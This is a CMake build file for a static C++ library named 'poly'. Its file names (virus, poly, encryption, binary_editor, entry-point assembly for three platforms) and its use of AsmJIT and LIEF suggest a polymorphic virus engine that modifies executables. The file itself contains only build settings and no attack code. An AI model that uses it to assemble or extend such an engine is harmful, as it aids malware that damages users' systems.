set(HEADER_LIST
    engine.hpp
    enums.hpp
    host_properties.hpp
    utils.hpp
    binary_editor.hpp
    encryption.hpp
    virus.hpp
    poly.hpp
    filesystem.hpp
    ocompiler.hpp
)

set(SOURCE_LIST
    engine.tpp
    binary_editor.tpp
    utils.cpp
    utils.tpp
    encryption.tpp
    virus.tpp
    ocompiler.cpp
)

if(${CMAKE_HOST_SYSTEM_NAME} MATCHES "Darwin")
    list(APPEND SOURCE_LIST
        macos/binary_editor.cpp
        macos/get_entry_point_ra.S
        macos/engine.tpp
    )

    list(APPEND HEADER_LIST
        macos/binary_editor.hpp
        macos/engine.hpp
    )
endif()

if(${CMAKE_HOST_SYSTEM_NAME} MATCHES "Linux")
    list(APPEND SOURCE_LIST
        linux/binary_editor.cpp
        linux/get_entry_point_ra.S
        linux/engine.tpp
    )

    list(APPEND HEADER_LIST
        linux/binary_editor.hpp
        linux/engine.hpp
    )
endif()

if(${CMAKE_HOST_SYSTEM_NAME} MATCHES "Windows")
    list(APPEND SOURCE_LIST
        windows/binary_editor.cpp
        windows/engine.tpp
    )

    if (MSVC)
        list(APPEND SOURCE_LIST windows/get_entry_point_ra.asm)
    else()
        list(APPEND SOURCE_LIST windows/get_entry_point_ra.S)
    endif()
    
    list(APPEND HEADER_LIST
        windows/binary_editor.hpp
        windows/engine.hpp
    )
endif()

# Append the include dir to all include files
list(TRANSFORM HEADER_LIST PREPEND "${Poly_SOURCE_DIR}/include/poly/")
list(TRANSFORM SOURCE_LIST PREPEND "${Poly_SOURCE_DIR}/src/")

add_library(poly STATIC ${HEADER_LIST} ${SOURCE_LIST})
set_target_properties(poly
    PROPERTIES POSITION_INDEPENDENT_CODE ON
    CXX_STANDARD 14
    CXX_STANDARD_REQUIRED ON
    CXX_VISIBILITY_PRESET hidden
)

target_compile_options(poly
    INTERFACE
    "-fvisibility=hidden"
)

# Required by AsmJIT to link itself statically in the correct way
target_compile_definitions(poly PUBLIC ASMJIT_STATIC)

if(MSVC)
    # Needed by LIEF for the 'and', 'or' ... keywords
    target_compile_options(poly PUBLIC /FIiso646.h)

    # Needed by LIEF to use his version of msvcrt.lib
    target_link_options(poly PUBLIC /NODEFAULTLIB:MSVCRT)
endif()

target_include_directories(poly
    PUBLIC
    "${Poly_SOURCE_DIR}/include"
    "${Poly_SOURCE_DIR}/src"
)

target_link_libraries(poly
    PUBLIC
    ${LIB_ASMJIT}
    ${LIB_LIEF}
    ${LIB_FS}
)

if(MINGW AND(CMAKE_CXX_COMPILER_ID STREQUAL "GNU"))
    set(LINKER_SCRIPT "${CMAKE_SOURCE_DIR}/scripts/windows/mingw_gcc_linker.ld")

    target_link_options(poly
        INTERFACE
        "SHELL:-T ${LINKER_SCRIPT}"
    )

    set_target_properties(poly
        PROPERTIES LINK_DEPENDS ${LINKER_SCRIPT}
    )
endif()